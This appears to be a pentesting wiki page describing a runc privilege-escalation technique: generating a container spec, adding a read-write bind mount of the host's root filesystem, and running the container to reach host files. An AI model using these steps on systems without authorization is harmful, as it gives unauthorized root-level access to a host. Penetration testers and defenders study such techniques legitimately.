# RunC Privilege Escalation

## Basic information

If you want to learn more about **runc** check the following page:

{% page-ref page="../../pentesting/2375-pentesting-docker.md" %}

## PE

If you find that `runc` is installed in the host you may be able to **run a container mounting the root / folder of the host**.

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

{% hint style="danger" %}
This won't always work as the default operation of runc is to run as root, so running it as an unprivileged user simply cannot work \(unless you have a rootless configuration\). Making a rootless configuration the default isn't generally a good idea because there are quite a few restrictions inside rootless containers that don't apply outside rootless containers.
{% endhint %}





